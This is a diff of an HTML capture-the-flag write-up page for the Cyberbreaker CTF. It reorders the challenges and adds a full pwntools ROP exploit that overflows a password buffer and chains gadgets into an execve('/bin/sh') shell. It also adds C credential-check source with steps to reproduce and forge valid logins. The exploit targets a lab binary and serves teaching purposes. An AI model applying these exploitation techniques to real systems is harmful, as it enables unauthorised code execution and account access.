@@ -6,12 +6,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="x-ua-compatible" content="ie=edge">
 
-    <meta property="og:title" content="Cyber-breaker CTF (Attack Session) Solver Scripts & Documentation" />
-    <meta property="og:description" content="Solver scripts for Binary Exploitation and Web Security challenges" />
+    <meta property="og:title" content="Cyberbreaker CTF - Attack Session Writeup Documentation" />
+    <meta property="og:description" content="Hacking My Way Into Your Heart" />
     <meta property="og:url" content="https://w333zard.my.id" />
     <meta
       property="og:image"
-      content="https://i.pinimg.com/736x/a9/d8/d4/a9d8d4e03e8251836546c97948609687.jpg"
+      content="https://i.pinimg.com/736x/cd/b9/cc/cdb9ccd989e14e849a472a977af75ee0.jpg"
     />
 
     <title>Cyber-breaker CTF (Attack Session) Writeup Documentation</title>
@@ -229,17 +229,13 @@
                                 Solver scripts for Binary Exploitation and Web Security challenges
                             </p>
                             <div class="d-flex align-items-center my-4">
-                                <img class="" style="width:1200px;" src="assets/imgs/blog/blog-3/cover.jpg" alt="" />
+                                <img class="" style="width:1200px;" src="assets/imgs/blog/blog-4/cover2.png" alt="" />
                             </div>
                         </div>
                     </div>
                     <div class="col-lg-10 mx-lg-auto">
                         <div class="row">
                             <div class="col-lg-8 blog-content">
-                                <h3>Introduction</h3>
-                                <p>
-                                CBC Final Round - Binary & Web Exploitation Writeup
-                                </p>
 
                                 <div class="mt-4">
                                     <div class="bg-primary bg-opacity-10 border border-primary border-opacity-25 rounded-4 p-4">
@@ -248,6 +244,12 @@
                                             <h5 class="mb-0 text-primary">List of Challenges</h5>
                                         </div>
                                         <ol class="list-unstyled mb-0">
+                                            <li class="mb-2">
+                                                <a href="#starting-point" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>Starting Point</strong> <span class="text-muted">(Return-oriented Programming)</span></span>
+                                                </a>
+                                            </li>
                                             <li class="mb-2">
                                                 <a href="#bl1tz" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
                                                     <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
@@ -258,12 +260,6 @@
                                                 <a href="#e-market" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
                                                     <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
                                                     <span><strong>E-Market</strong> <span class="text-muted">(Mass Assignment + XXE Injection on Excel File)</span></span>
-                                                </a>
-                                            </li>
-                                            <li class="mb-2">
-                                                <a href="#starting-point" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
-                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
-                                                    <span><strong>Starting Point</strong> <span class="text-muted">(Return-oriented Programming)</span></span>
                                                 </a>
                                             </li>
                                             <li class="mb-2">
@@ -285,7 +281,172 @@
                                 <div class="mt-5">
                                     
                                     <div class="mt-4">
-                                        <h4 id="bl1tz">1. Bl1tz (Hard)</h4>
+                                        <h4 id="starting-point">1. Starting Point (Medium)</h4>
+                                        
+                                        <div class="challenge-summary">
+                                            <div class="summary-grid">
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Difficulty</p>
+                                                    <span class="difficulty-medium">Medium</span>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Category</p>
+                                                    <p class="summary-value">Binary Exploitation</p>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Topic</p>
+                                                    <p class="summary-value">Return-oriented Programming</p>
+                                                </div>
+                                            </div>
+                                            <div class="flag-container">
+                                                <p class="flag-text">CBD{ROP_ismuch_h4rd3r_th4n_OOP_h3h3h3_hckd_by_Wzrd}</p>
+                                                <button class="flag-copy-btn" onclick="copyFlag(this)">
+                                                    <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                    <span>Copy</span>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        
+                                        <p>We are given a Linux ELF 64-bit LSB binary executable. The challenge is about buffer overflow and ROP (return-oriented programming) in a CLI-based note manager app. The binary shows a simple menu that lets you create, view, and list notes. The notes themselves are stored in a fixed writable data area. The program will accepts user input for titles and contents, and there is also a separate Admin menu protected by a password. Based on the binary security of this challenge, the NX is enabled (so injected shellcode is not usable), the binary is not PIE (code and function addresses are fixed), and there is no stack canary in the vulnerable input path (so saved return address is overwritable). </p>
+
+                                        <p>In this case, because our code and gadgets stored at predictable addresses and NX prevents code execution on the stack, we can craft a ROP chain to pivot execution to the desired syscall sequence. Since the app binary is not PIE and there is no stack canary, our input can overwrite the saved return address and redirect execution to gadgets inside the binary. In other words, our goal is to either spawn a shell via <code>ret2libc</code> or making a system call (syscall) using C function such as <code>execve</code>. You can refer to the <a href="https://github.com/W-zrd/Nonstop-PWN-Reverse/blob/main/binary-exploitation/README.md#you-know-0xdiablos" target="_blank"><u>following link</u></a> for the basic explanation of Buffer Overflow vulnerability.</p>
+
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/13.png" alt="" />
+                                        </div>
+
+                                        <p>The most robust exploitation for this challenge is to write the string <code>/bin/sh\x00</code> into the writable notes area using the Create functionality and then builds a ROP chain that sets registers for an <code>execve</code> function and triggers syscall. The ret2libc approach would also worked as some participants tried it and successfully got the flag using this method. But ret2libc depends on leaking the address of puts and selecting the correct libc binary for the target because remote environments may use different libc versions. The syscall approach avoids those barrier by using gadgets/functions which present in the binary. Since the binary is not PIE and the notes array address is fixed, we get deterministic exploitation.</p>
+
+                                        <h5>Solution</h5>
+
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/14.png" alt="" />
+                                        </div>
+
+                                        <p>The vulnerable part of the challenge is in the Admin function. The Admin routine reads user input into a local stack buffer allocated for the password while the buffer is only 0x10 (16) bytes long. It will accepts far more input from the user which will cause the data after those 16 bytes to overwrite return address. Once the function returns, the execution will jump to our controlled value to spawn a shell and get the flag. For example, there is <code>path</code> function in the binary that will open the flag locally. In the following image, we manipulate the return address to points to a function that stores the local flag. To understand how does Buffer Overflow works, you can see the image below.</p>
+
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/15.png" alt="" />
+                                        </div>
+
+                                        <p>But instead of writing to the <code>path</code> function address, our goal is to open the flag on the server using <code>execve</code> syscall. With the same logic as the previous example, write <code>/bin/sh\x00</code> string into a note Title and Content. This ensures <code>/bin/sh</code> is present somewhere in writable memory we control. Second, Select the Admin menu option which prompts for a password and then fill it with the offset. Since the function saves the base pointer (8 bytes) above password buffer, overwriting the saved return pointer requires 16 + 8 = 24 bytes of filler, and that is our offset.</p>
+
+                                        <p>The rest of the step is about crafting our ROP chain exploit. We need to enumerate gadgets/functions inside the binary that is useful for calling the syscall. You can use ropper, ropgadget, or objdump to do this. For example, The following function addresses can be useful for our exploit.</p>
+
+                                        <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Python</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-python">objdump -d chall | egrep -n "pop_rdi|pop_rax|pop_rsi|pop_rdx|syscall"
+275:0000000000401359 pop_rdi:
+279:000000000040135b pop_rsi:
+283:000000000040135d pop_rdx:
+287:000000000040135f pop_rax:
+291:0000000000401361 pop_rdx_rbx:
+296:0000000000401364 syscall_gadget:
+</code></pre>
+                                            </div>
+                                        </div>
+
+                                        
+                                        <p>The payload begins by overflowing the stack frame up to the saved return address with 24 offset as we calculate earlier. From this, we can control the return address of the program immediately after the stack padding. The next entry is <code>p64(pop_rax)</code> which is a function address that pop values from the stack into registers and return.</p>
+
+                                        <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Python</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-python">payload = flat([
+    b'A' * 24,
+    p64(pop_rax),
+    p64(0x59),
+    p64(pop_rdi),
+    p64(notes_addr),
+    p64(pop_rsi),
+    p64(0x0),
+    p64(pop_rdx),
+    p64(0x0),
+    p64(syscall),
+])
+</code></pre>
+                                            </div>
+                                        </div>
+
+                                        <p>After that, we need to set the <code>rax</code> register to <code>59</code> which is the syscall number for <code>execve</code> in Linux x86_64 architecture. Dont forget to set rdi to point at the <code>/bin/sh</code> string that was previously written into the program, by using <code>p64(pop_rdi); p64(notes_addr)</code>. By writing this, it means that we set <code>/bin/sh</code> as the first argument to execve function. The rest of the ROP chain is just to fill <code>execve</code> arguments. You can refer to <a href="https://linux.die.net/man/2/execve" target="_blank"><u>this link</u></a> for more information about the <code>execve</code> system call.</p>
+
+                                        <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Python</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+context.log_level = 'debug'
+elf = ELF('./chall')
+p = process('./chall')
+notes_addr = elf.symbols['notes']
+
+offset = 24
+pop_rax = 0x40135f
+pop_rdi = 0x401359
+pop_rsi = 0x40135b
+pop_rdx = 0x40135d
+syscall = 0x401364
+
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b'Title: ', b'/bin/sh\x00')
+p.sendlineafter(b'Content: ', b'/bin/sh\x00')
+
+p.sendlineafter(b'> ', b'4')
+payload = flat([
+    b'A' * offset,
+    p64(pop_rax),
+    p64(59),
+    p64(pop_rdi),
+    p64(notes_addr),
+    p64(pop_rsi),
+    p64(0),
+    p64(pop_rdx),
+    p64(0),
+    p64(syscall),
+])
+p.sendlineafter(b'Password: ', payload)
+
+p.interactive()
+</code></pre>
+                                            </div>
+                                        </div>
+
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/16.png" alt="" />
+                                        </div>
+                                    </div>
+
+                                    <div class="mt-4">
+                                        <h4 id="bl1tz">2. Bl1tz (Hard)</h4>
                                         
                                         <div class="challenge-summary">
                                             <div class="summary-grid">
@@ -547,7 +708,7 @@ else:
                                     </div>
 
                                     <div class="mt-4">
-                                        <h4 id="e-market">2. E-Market (Hard)</h4>
+                                        <h4 id="e-market">3. E-Market (Hard)</h4>
                                         
                                         <div class="challenge-summary">
                                             <div class="summary-grid">
@@ -645,178 +806,11 @@ else:
                                     <div class="d-flex align-items-center my-2">
                                             <img class="" src="assets/imgs/blog/blog-4/12.png" alt="" />
                                     </div>
-
-                                    <div class="mt-4">
-                                        <h4 id="starting-point">3. Starting Point (Medium)</h4>
-                                        
-                                        <div class="challenge-summary">
-                                            <div class="summary-grid">
-                                                <div class="summary-item">
-                                                    <p class="summary-label">Difficulty</p>
-                                                    <span class="difficulty-medium">Medium</span>
-                                                </div>
-                                                <div class="summary-item">
-                                                    <p class="summary-label">Category</p>
-                                                    <p class="summary-value">Binary Exploitation</p>
-                                                </div>
-                                                <div class="summary-item">
-                                                    <p class="summary-label">Topic</p>
-                                                    <p class="summary-value">Return-oriented Programming</p>
-                                                </div>
-                                            </div>
-                                            <div class="flag-container">
-                                                <p class="flag-text">CBD{ROP_ismuch_h4rd3r_th4n_OOP_h3h3h3_hckd_by_Wzrd}</p>
-                                                <button class="flag-copy-btn" onclick="copyFlag(this)">
-                                                    <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
-                                                    <span>Copy</span>
-                                                </button>
-                                            </div>
-                                        </div>
-                                        
-                                        <p>Moving to the next challenge, we are given a Linux ELF 64-bit LSB binary executable. The challenge is about buffer overflow and ROP (return-oriented programming) in a CLI-based note manager app. The binary shows a simple menu that lets you create, view, list, and read admin notes. The notes themselves are stored in a fixed writable data area. The program will accepts user input for titles and contents, and there is also a separate Admin menu protected by a password. Based on the binary security of this challenge, the NX is enabled (so injected shellcode is not usable), the binary is not PIE (code and function addresses are fixed), and there is no stack canary in the vulnerable input path (so saved return address is overwritable). </p>
-
-                                        <p>In this case, because our code and gadgets stored at predictable addresses and NX prevents code execution on the stack, we can craft a ROP chain to pivot execution to the desired syscall sequence. Since the app binary is not PIE and there is no stack canary, our input can overwrite the saved return address and redirect execution to gadgets inside the binary. In other words, our goal is to either spawn a shell via <code>ret2libc</code> or making a system call (syscall) using C function such as <code>execve</code>. You can refer to the <a href="https://github.com/W-zrd/Nonstop-PWN-Reverse/blob/main/binary-exploitation/README.md#you-know-0xdiablos" target="_blank"><u>following link</u></a> for the basic explanation of Buffer Overflow vulnerability.</p>
-
-                                        <div class="d-flex align-items-center my-2">
-                                            <img class="" src="assets/imgs/blog/blog-4/13.png" alt="" />
-                                        </div>
-
-                                        <p>The most robust exploitation for this challenge is to write the string <code>/bin/sh\x00</code> into the writable notes area using the Create functionality and then builds a ROP chain that sets registers for an <code>execve</code> function and triggers syscall. The ret2libc approach would also worked as some participants tried it and successfully got the flag using this method. But ret2libc depends on leaking the address of puts and selecting the correct libc binary for the target because remote environments may use different libc versions. The syscall approach avoids those barrier by using gadgets/functions which present in the binary. Since the binary is not PIE and the notes array address is fixed, we get deterministic exploitation.</p>
-
-                                        <h5>Solution</h5>
-
-                                        <div class="d-flex align-items-center my-2">
-                                            <img class="" src="assets/imgs/blog/blog-4/14.png" alt="" />
-                                        </div>
-
-                                        <p>The vulnerable part of the challenge is in the Admin function. The Admin routine reads user input into a local stack buffer allocated for the password while the buffer is only 0x10 (16) bytes long. It will accepts far more input from the user which will cause the data after those 16 bytes to overwrite return address. Once the function returns, the execution will jump to our controlled value to spawn a shell and get the flag. For example, there is <code>path</code> function in the binary that will open the flag locally. In the following image, we manipulate the return address to points to a function that stores the local flag. To understand how does Buffer Overflow works, you can see the image below.</p>
-
-                                        <div class="d-flex align-items-center my-2">
-                                            <img class="" src="assets/imgs/blog/blog-4/15.png" alt="" />
-                                        </div>
-
-                                        <p>But instead of writing to the <code>path</code> function address, our goal is to open the flag on the server using <code>execve</code> syscall. With the same logic as the previous example, write <code>/bin/sh\x00</code> string into a note Title and Content. This ensures <code>/bin/sh</code> is present somewhere in writable memory we control. Second, Select the Admin menu option which prompts for a password and then fill it with the offset. Since the function saves the base pointer (8 bytes) above password buffer, overwriting the saved return pointer requires 16 + 8 = 24 bytes of filler, and that is our offset.</p>
-
-                                        <p>The rest of the step is about crafting our ROP chain exploit. We need to enumerate gadgets/functions inside the binary that is useful for calling the syscall. You can use ropper, ropgadget, or objdump to do this. For example, The following function addresses can be useful for our exploit.</p>
-
-                                        <div class="code-container">
-                                            <div class="code-content">
-                                                <div class="code-controls">
-                                                    <div class="code-language">
-                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
-                                                        <span>Python</span>
-                                                    </div>
-                                                    <button class="copy-btn" onclick="copyCode(this)">
-                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
-                                                        <span>Copy</span>
-                                                    </button>
-                                                </div>
-                                                <pre><code class="language-python">objdump -d chall | egrep -n "pop_rdi|pop_rax|pop_rsi|pop_rdx|syscall"
-275:0000000000401359 pop_rdi:
-279:000000000040135b pop_rsi:
-283:000000000040135d pop_rdx:
-287:000000000040135f pop_rax:
-291:0000000000401361 pop_rdx_rbx:
-296:0000000000401364 syscall_gadget:
-</code></pre>
-                                            </div>
-                                        </div>
-
-                                        
-                                        <p>The payload begins by overflowing the stack frame up to the saved return address with 24 offset as we calculate earlier. From this, we can control the return address of the program immediately after the stack padding. The next entry is <code>p64(pop_rax)</code> which is a function address that pop values from the stack into registers and return.</p>
-
-                                        <div class="code-container">
-                                            <div class="code-content">
-                                                <div class="code-controls">
-                                                    <div class="code-language">
-                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
-                                                        <span>Python</span>
-                                                    </div>
-                                                    <button class="copy-btn" onclick="copyCode(this)">
-                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
-                                                        <span>Copy</span>
-                                                    </button>
-                                                </div>
-                                                <pre><code class="language-python">payload = flat([
-    b'A' * 24,
-    p64(pop_rax),
-    p64(0x59),
-    p64(pop_rdi),
-    p64(notes_addr),
-    p64(pop_rsi),
-    p64(0x0),
-    p64(pop_rdx),
-    p64(0x0),
-    p64(syscall),
-])
-</code></pre>
-                                            </div>
-                                        </div>
-
-                                        <p>After that, we need to set the <code>rax</code> register to <code>59</code> which is the syscall number for <code>execve</code> in Linux x86_64 architecture. Dont forget to set rdi to point at the <code>/bin/sh</code> string that was previously written into the program, by using <code>p64(pop_rdi); p64(notes_addr)</code>. By writing this, it means that we set <code>/bin/sh</code> as the first argument to execve function. The rest of the ROP chain is just to fill <code>execve</code> arguments. You can refer to <a href="https://linux.die.net/man/2/execve" target="_blank"><u>this link</u></a> for more information about the <code>execve</code> system call.</p>
-
-                                        <div class="code-container">
-                                            <div class="code-content">
-                                                <div class="code-controls">
-                                                    <div class="code-language">
-                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
-                                                        <span>Python</span>
-                                                    </div>
-                                                    <button class="copy-btn" onclick="copyCode(this)">
-                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
-                                                        <span>Copy</span>
-                                                    </button>
-                                                </div>
-                                                <pre><code class="language-python">#!/usr/bin/env python3
-from pwn import *
-
-context.log_level = 'debug'
-elf = ELF('./chall')
-p = process('./chall')
-notes_addr = elf.symbols['notes']
-
-offset = 24
-pop_rax = 0x40135f
-pop_rdi = 0x401359
-pop_rsi = 0x40135b
-pop_rdx = 0x40135d
-syscall = 0x401364
-
-p.sendlineafter(b'> ', b'1')
-p.sendlineafter(b'Title: ', b'/bin/sh\x00')
-p.sendlineafter(b'Content: ', b'/bin/sh\x00')
-
-p.sendlineafter(b'> ', b'4')
-payload = flat([
-    b'A' * offset,
-    p64(pop_rax),
-    p64(59),
-    p64(pop_rdi),
-    p64(notes_addr),
-    p64(pop_rsi),
-    p64(0),
-    p64(pop_rdx),
-    p64(0),
-    p64(syscall),
-])
-p.sendlineafter(b'Password: ', payload)
-
-p.interactive()
-</code></pre>
-                                            </div>
-                                        </div>
-
-                                        <div class="d-flex align-items-center my-2">
-                                            <img class="" src="assets/imgs/blog/blog-4/16.png" alt="" />
-                                        </div>
-                                    </div>
                              
                                 </div>
 
                                 <div class="mt-5">
-                                    
-                                    
-
+             
                                     <div class="mt-4">
                                         <h4 id="ncurse">4. Ncurse (Easy)</h4>
                                         
@@ -902,7 +896,7 @@ print(p.recvall())
                                                 </div>
                                             </div>
                                             <div class="flag-container">
-                                                <p class="flag-text">CBC{bl1zzard_web_reversing_logic_2024}</p>
+                                                <p class="flag-text">CBD{bang_bagi_p3yl0t_h3h3h3_hckd_by_Wzrd}</p>
                                                 <button class="flag-copy-btn" onclick="copyFlag(this)">
                                                     <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
                                                     <span>Copy</span>
@@ -910,7 +904,221 @@ print(p.recvall())
                                             </div>
                                         </div>
                                         
-                                        <p>This challenge was intended to be a web assembly and reverse engineering problem case. But the author didnt have time to build the code and logic :( Anyway, here is the solver script</p>
+                                        <p>The last challenge is about web-reversing / logic-reconstruction task. The web app has a deterministic username/password check on the server, and your goal is to reverse that logic. The core topics here are string hashing (DJB2 and FNV-1a), checksum arithmetic, and brute-forcing. This problem is about understanding the sequence of checks and then reproducing that algorithm to generate valid credentials.</p>
+
+                                        <p>Actually this challenge was nerfed from hard to this easy because i dont have much time to build the infrastructure and web assembly things. So i decided to give the C source code to the participants but harden the reversing logic. Overall, this challenge will load a webAssembly (wasm) file like the image below, but it's still easy to solve because we only have to do a white box testing by checking the logic in the given source code.</p>
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/20.png" alt="" />
+                                        </div>
+
+                                        <h5>Solution</h5>
+                                        <p>What makes this web target exploitable is because the password generated with a reversible algorithm. We can generate valid credentials by ourselves. The username validation forces length, composition (at least 2 letters and 1 digit), an ASCII-sum window, and 2 strong constraints on a combined 32-bit hash (divisibility by 42 and a low byte equal to <code>0x7E</code>).</p>
+
+                                        <p>The password is then produced by XOR with a checksum-derived repeated byte pattern, XOR with a time-based seed, a linear congruential step, and a final XOR with a validation key. The result is reduced into the six-digit range. Since the time seed and validation key are static in the challenge, the entire transform is deterministic and reproducible. This deterministic design makes brute-force applicable.</p>
+
+                                        <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>C</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-c">#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+
+
+static const char alpha_map[] = "ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz";
+static const char num_map[] = "9876543210";
+
+static const uint32_t MAGIC_PRIME = 0x1F2F3F4F;
+static const uint32_t VALIDATION_KEY = 0x41424344;
+static const uint32_t TIME_SEED = 1640995200; 
+
+uint32_t djb2_hash(const char* str, int len) {
+    uint32_t hash = 5381;
+    for (int i = 0; i < len; i++) {
+        hash = ((hash << 5) + hash) + str[i];
+    }
+    return hash;
+}
+
+uint32_t fnv1a_hash(const char* str, int len) {
+    uint32_t hash = 2166136261u;
+    for (int i = 0; i < len; i++) {
+        hash ^= str[i];
+        hash *= 16777619;
+    }
+    return hash;
+}
+
+uint32_t combined_hash(const char* str, int len) {
+    uint32_t djb2 = djb2_hash(str, len);
+    uint32_t fnv1a = fnv1a_hash(str, len);
+    uint32_t combined = djb2 ^ fnv1a;
+    combined = (combined << 13) | (combined >> 19);
+    
+    return combined ^ MAGIC_PRIME;
+}
+
+int uint_to_string(uint32_t num, char* str) {
+    if (num == 0) {
+        str[0] = '0';
+        str[1] = '\0';
+        return 1;
+    }
+    
+    char temp[16];
+    int i = 0;
+    while (num > 0) {
+        temp[i++] = '0' + (num % 10);
+        num /= 10;
+    }
+    
+    for (int j = 0; j < i; j++) {
+        str[j] = temp[i - 1 - j];
+    }
+    str[i] = '\0';
+    
+    return i;
+}
+
+uint8_t calculate_checksum(const char* data, int len) {
+    uint32_t checksum = 0;
+    for (int i = 0; i < len; i++) {
+        checksum += data[i] * (i + 1) * 17;
+    }
+    return (checksum ^ (checksum >> 8) ^ (checksum >> 16)) & 0xFF;
+}
+
+char transform_char(char c, int position) {
+    if (c >= 'A' && c <= 'Z') {
+        int idx = c - 'A';
+        return alpha_map[idx] ^ (position & 0x1F);
+    } else if (c >= 'a' && c <= 'z') {
+        int idx = 26 + (c - 'a');
+        return alpha_map[idx] ^ (position & 0x1F);
+    } else if (c >= '0' && c <= '9') {
+        return num_map[c - '0'] ^ (position & 0x0F);
+    }
+    return c ^ (position & 0x07);
+}
+
+int validate_username_format(const char* username, int len) {
+    if (len < 6 || len > 10) return 0;
+    
+    int letter_count = 0, digit_count = 0;
+    for (int i = 0; i < len; i++) {
+        if ((username[i] >= 'A' && username[i] <= 'Z') || 
+            (username[i] >= 'a' && username[i] <= 'z')) {
+            letter_count++;
+        } else if (username[i] >= '0' && username[i] <= '9') {
+            digit_count++;
+        }
+    }
+    if (letter_count < 2 || digit_count < 1) return 0;
+    
+    uint32_t ascii_sum = 0;
+    for (int i = 0; i < len; i++) {
+        ascii_sum += username[i];
+    }
+    if (ascii_sum < 400 || ascii_sum > 800) return 0;
+    uint32_t hash = combined_hash(username, len);
+    if (hash % 42 != 0) return 0;
+    if ((hash & 0xFF) != 0x7E) return 0;
+    
+    return 1;
+}
+
+uint32_t generate_expected_password(const char* username, int len) {
+    uint32_t base_hash = combined_hash(username, len);
+    uint8_t checksum = calculate_checksum(username, len);
+    uint32_t transformed = base_hash ^ (checksum * 0x01010101);
+    transformed ^= TIME_SEED;
+    transformed = (transformed * 0x41C64E6D) + 0x3039;
+    transformed ^= VALIDATION_KEY;
+    return (transformed % 999999) + 100000;
+}
+
+int verify_credentials(const char* username, int username_len, uint32_t password) {
+    if (!validate_username_format(username, username_len)) {
+        return 0;
+    }
+    uint32_t expected = generate_expected_password(username, username_len);
+    if (password != expected) {
+        return 0;
+    }
+    uint32_t digit_sum = 0;
+    uint32_t temp = password;
+    while (temp > 0) {
+        digit_sum += temp % 10;
+        temp /= 10;
+    }
+    if (digit_sum % 7 != 0) return 0;
+    char pwd_str[8];
+    uint_to_string(password, pwd_str);
+    int pwd_len = strlen(pwd_str);
+    int is_palindrome = 1;
+    for (int i = 0; i < pwd_len / 2; i++) {
+        if (pwd_str[i] != pwd_str[pwd_len - 1 - i]) {
+            is_palindrome = 0;
+            break;
+        }
+    }
+    if (is_palindrome) return 0;
+    
+    return 1;
+}
+__attribute__((export_name("authenticate")))
+int authenticate(uint32_t username_ptr, uint32_t username_len, uint32_t password) {
+    char* username = (char*)username_ptr;
+    if (username_len > 50 || username_len < 1) {
+        return 0;
+    }
+    return verify_credentials(username, username_len, password);
+}
+__attribute__((export_name("get_expected_password")))
+uint32_t get_expected_password(uint32_t username_ptr, uint32_t username_len) {
+    char* username = (char*)username_ptr;
+    if (username_len > 50 || username_len < 1) {
+        return 0;
+    }
+    if (!validate_username_format(username, username_len)) {
+        return 0;
+    }
+    
+    return generate_expected_password(username, username_len);
+}
+__attribute__((export_name("get_username_hash")))
+uint32_t get_username_hash(uint32_t username_ptr, uint32_t username_len) {
+    char* username = (char*)username_ptr;
+    
+    if (username_len > 50 || username_len < 1) {
+        return 0;
+    }
+    
+    return combined_hash(username, username_len);
+}
+</code></pre>
+                                            </div>
+                                        </div>
+
+                                        <p></p>
+
+                                        <p>The solving flow is straightforward once the validation logic is understood. First, reimplement every check from the server: 
+                                            <ul>
+                                                <li>The two hashes (<code>djb2</code> and <code>fnv1a</code>) and how they are rotated</li>
+                                                <li>The ASCII-sum window and the checksum function used for transforming the hash into a password</li>
+                                                <li>The password constraints (six-digit range, digit-sum modulo condition, non-palindrome). </li>
+                                                <li>For the username contraints, reject anything outside length 6–10, anything without at least two letters and one digit, and anything whose ASCII sum falls outside 400–800. </li>
+                                            </ul>
+                                        </p>
+
+                                        <p>Next apply the combined-hash constraints and test whether the combined value is divisible by 42 and whether its low byte equals <code>0x7E</code>. After a username survives those filters, compute the exact password using the same arithmetic seen on the source code (checksum mixing, XOR with the fixed <code>TIME_SEED</code>, XOR with the <code>VALIDATION_KEY</code>, and reduction to the six-digit range). Finally, validate the numeric password against the remaining rules (digit sum divisible by 7 and not a palindrome). Here is the solver script</p>
                                         <div class="code-container">
                                             <div class="code-content">
                                                 <div class="code-controls">
@@ -1166,6 +1374,9 @@ if __name__ == "__main__":
 </code></pre>
                                             </div>
                                         </div>
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/21.png" alt="" />
+                                        </div>
                                     </div>
                                 </div>
                                 
@@ -1180,6 +1391,12 @@ if __name__ == "__main__":
                                         </div>
                                         <ol class="list-unstyled mb-0">
                                             <li class="mb-2">
+                                                <a href="#starting-point" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>Starting Point</strong> <span class="text-muted">(Medium)</span></span>
+                                                </a>
+                                            </li>
+                                            <li class="mb-2">
                                                 <a href="#bl1tz" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
                                                     <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
                                                     <span><strong>Bl1tz</strong> <span class="text-muted">(Hard)</span></span>
@@ -1189,12 +1406,6 @@ if __name__ == "__main__":
                                                 <a href="#e-market" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
                                                     <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
                                                     <span><strong>E-Market</strong> <span class="text-muted">(Hard)</span></span>
-                                                </a>
-                                            </li>
-                                            <li class="mb-2">
-                                                <a href="#starting-point" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
-                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
-                                                    <span><strong>Starting Point</strong> <span class="text-muted">(Medium)</span></span>
                                                 </a>
                                             </li>
                                             <li class="mb-2">
@@ -1263,8 +1474,8 @@ if __name__ == "__main__":
                             </div>
                             <div class="blog-card__content position-relative text-center mt-4">
                                 <span class="blog-card__date fs-7">November 5, 2024 • 7 min read</span>
-                                <h5 class="blog-card__title">Cyber-breaker CTF (Attack Session) Solver Scripts & Documentation</h5>
-                                <p class="blog-card__description fs-6">Summary of all my findings over the past 3 years</p>
